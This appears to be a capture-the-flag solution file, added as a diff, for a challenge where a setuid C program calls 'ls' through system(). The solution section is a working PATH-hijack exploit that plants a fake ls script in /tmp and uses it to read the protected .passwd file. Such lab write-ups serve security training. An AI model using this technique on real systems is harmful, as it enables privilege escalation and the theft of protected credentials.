@@ -1,0 +1,15 @@
+# Eat another one, just for fun !
+
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(){
+    system("ls -lA /challenge/app-script/ch12/.passwd");
+    return 0;
+}
+
+# Solution
+mkdir /tmp/ok
+echo '#!/bin/sh' > /tmp/ok/ls; echo '/bin/cat /challenge/app-script/ch12/.passwd' >> /tmp/ok/ls; /bin/chmod +x /tmp/ok/ls
+export PATH=/tmp/ok:$PATH
+./ch12
